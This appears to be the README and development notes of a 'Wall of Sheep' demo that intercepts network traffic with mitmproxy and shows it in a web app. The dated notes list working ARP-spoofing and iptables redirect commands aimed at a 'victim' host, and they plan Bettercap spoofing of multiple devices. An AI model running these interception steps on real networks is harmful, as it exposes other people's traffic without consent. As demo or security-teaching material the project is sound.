# TheWallOfSheep_Demo

## Install requirements
`pip install -r requirements.txt`

### Venv(Options)
If your want to protect your computer envirement, using venv.
`python -m venv venv`
`./venv/Scripts/activate`
or
`source ./venv/Scripts/activate`
then
`pip install -r requirements.txt`

## Put mitm cert into your system
`mitmdump -s ./proxy/proxy.py`
After allowing traffic to pass through the proxy, connect to http://mitm.it. You can download a cert for your system.

## Run Web app

`python ./app/app.py`

## 0829

- Kali
  - sudo sysctl -w net.ipv4.ip_forward=1
  - sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
  - sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
  - mitmproxy -s ./proxy/proxy.py
  - python3 ./app/app.py
host: .60
iphone: .101
mitmproxy: .62
: 因為是透過 websocket 拿 mitmproxy 的東西然後放到前端，如果在 .62 以外的地方打開網頁會看不到 proxy 的流量，所以這邊可能要修改。
: 因為 https 沒有憑證不能解密，所以 mitmproxy 收到 https 時不能用，但是現在 proxy 因為通通攔截下來，所以受害者流量通過 https 時會直接攔截不到，導致網頁直接連不上，看看能不能改成只攔截 http。

## 0830
- sudo iptables -t nat -F
- sudo iptables -t nat -L -v -n
- sudo sysctl -w net.ipv4.ip_forward=1
- sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
- sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
- sudo arpspoof -i eth0 -t 192.168.1.60 192.168.1.1
- sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.60
- ./venv/bin/mitmdump -v -s ./proxy/proxy.py
- python ./app/app.py

- HTTPS 實際環境上應該抓不到，看看 Web 那端要不要改掉，然後可以用 Bettercap 對多個設備進行 arp spoofing

## 0902
- 已經大致把想做的功能做完，Project 還需要把 README 調整好，然後嘗試使用 Bettercap 對網內的 IP 進行攻擊
- 可以嘗試看看有沒有機會做"防禦"相關內容 ?
- 弄成 Docker ?
